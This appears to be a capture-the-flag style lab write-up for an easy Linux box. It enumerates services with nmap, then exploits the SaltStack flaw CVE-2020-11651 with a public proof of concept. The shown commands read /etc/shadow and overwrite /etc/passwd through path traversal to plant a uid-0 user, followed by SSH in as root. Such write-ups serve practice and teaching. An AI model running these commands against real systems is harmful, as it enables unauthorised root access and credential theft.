---
tags:
  - Linux
---
Difficulty: Easy
# Enumeration

I'll start with a basic nmap version scan so we can start enumerating common services. We find that we have SSH, DNS, and HTTP on ports 80 and 8000.

`nmap -sV -sC 192.168.162.62 -oN def_ver.nmap`

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 44:7d:1a:56:9b:68:ae:f5:3b:f6:38:17:73:16:5d:75 (RSA)
|   256 1c:78:9d:83:81:52:f4:b0:1d:8e:32:03:cb:a6:18:93 (ECDSA)
|_  256 08:c9:12:d9:7b:98:98:c8:b3:99:7a:19:82:2e:a3:ea (ED25519)
53/tcp   open  domain  NLnet Labs NSD
80/tcp   open  http    nginx 1.16.1
|_http-server-header: nginx/1.16.1
|_http-title: Home | Mezzanine
8000/tcp open  http    nginx 1.16.1
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Site doesn't have a title (application/json).
|_http-server-header: nginx/1.16.1
```

While starting to look into the services running on these open ports, I'll let another nmap scan run in the background to scan all ports 0-65535, not just the common ones. In addition to the open ports above, this shows that we also have ZMTP on 4505/4506

`nmap -sV 192.168.162.62 -p- -oN all_ver.nmap`

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
53/tcp   open  domain  NLnet Labs NSD
80/tcp   open  http    nginx 1.16.1
4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
8000/tcp open  http    nginx 1.16.1
```

## Mezzanine CMS

As shown by the scan above, we have an instance of the Mezzanine CMS being served by Nginx on port 80. It's built using the Django web framework for Python.

![[Pasted image 20250421152146.png]]

I don't see any version number, and it doesn't look like it has many CVEs in its history, with the one listed being XSS, so likely not very useful in our lab.

![[Pasted image 20250421153409.png]]

Since it's a default instance, I'm interested in checking for default passwords. In the case of WordPress, I know we would be able to leverage admin panel access for a webshell on the backend server.

[By Mezzanine's docs](https://mezzanine.readthedocs.io/en/latest/overview.html?highlight=default#installation), it looks like the admin page is on /admin, and default credentials would be admin:default, but this is unsuccessful.

With no glaring issues here, I'll move on.

## Salt REST API

On port 8000, also running Nginx, we get the following JSON response body:
`{"clients": ["local", "local_async", "local_batch", "local_subset", "runner", "runner_async", "ssh", "wheel", "wheel_async"], "return": "Welcome"}`

Googling this brings us to the [Salt REST API](https://salt-sproxy.readthedocs.io/en/latest/salt_api.html), which is used to "automate the management and configuration of network devices at scale."

# Gaining RCE via CVE-2020-11651
With more research as well as looking into the ZMTP 2.0 service, I came across an RCE vulnerability in Saltstack 3000.1: 
- https://www.exploit-db.com/exploits/48421
- https://github.com/jasperla/CVE-2020-11651-poc

After installing salt, I had to install other dependencies using pip one-by-one while trying to run the script. Eventually, I was able to run it. passing `-p 8000` and `-p 4505` were unsuccessful, but using the script's default port of 4506 allowed it to run farther and confirm that the salt instance is vulnerable to CVE2020-11651.

The screenshot below shows warnings after the script's output, but we can ignore these by running it with the `-W ignore` Python option.

![[Pasted image 20250421165603.png]]

I made many unsuccessful attempts at using the --exec option to gain a reverse shell on the system, but found that I was able to read /etc/shadow, meaning we're executing commands as root.

`python3 saltstack.py -m 192.168.162.62 -r '/etc/shadow'`

```
[+] Checking salt-master (192.168.162.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: MpZiP+J3yTzjOQ+ILgZ7KN+os/Jadne3sLha7b7kNz2jLBxBC9hDlajSCObG/ZASPF1RfAr9Lrs=
[+] Attemping to read /etc/shadow from 192.168.162.62
root:$6$WT0RuvyM$WIZ6pBFcP7G4pz/jRYY/LBsdyFGIiP3SLl0p32mysET9sBMeNkDXXq52becLp69Q/Uaiu8H0GxQ31XjA8zImo/:18400:0:99999:7:::
bin:*:17834:0:99999:7:::
daemon:*:17834:0:99999:7:::
adm:*:17834:0:99999:7:::
lp:*:17834:0:99999:7:::
...
```

Since we can also write files, we may be able to overwrite the /etc/passwd file to remove the root user's password requirement or add a new user. I only had luck with the latter method. First I first read the contents of /etc/passwd, copied them into a file, and inserted a newline manually. We can generate the password used in this line with openssl:

`openssl passwd my_password`

```
$1$NuF1P2JI$wiivhE2UJ.Z46caxeWlv/0
```

(Add to /etc/passwd to create a new root user on the system with a password of our choice)
`r00t:$1$NuF1P2JI$wiivhE2UJ.Z46caxeWlv/0:0:0:root:/root:/bin/bash`

`python3 -W ignore saltstack.py -m 192.168.162.62 --upload-src passwd --upload-dest ../../../../../../etc/passwd`

```
[+] Checking salt-master (192.168.162.62:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: MpZiP+J3yTzjOQ+ILgZ7KN+os/Jadne3sLha7b7kNz2jLBxBC9hDlajSCObG/ZASPF1RfAr9Lrs=
[+] Attemping to upload passwd to ../../../../../../etc/passwd on 192.168.162.62
[ ] Wrote data to file /srv/salt/../../../../../../etc/passwd
```

---

`ssh r00t@192.168.162.62`

```
r00t@192.168.162.62's password: 
Last failed login: Mon Apr 21 20:55:48 EDT 2025 from 192.168.45.232 on ssh:notty
There were 2 failed login attempts since the last successful login.
[root@twiggy ~]# ls
proof.txt
```

From here we're able to `cat` proof.txt to submit the flag and finish the room.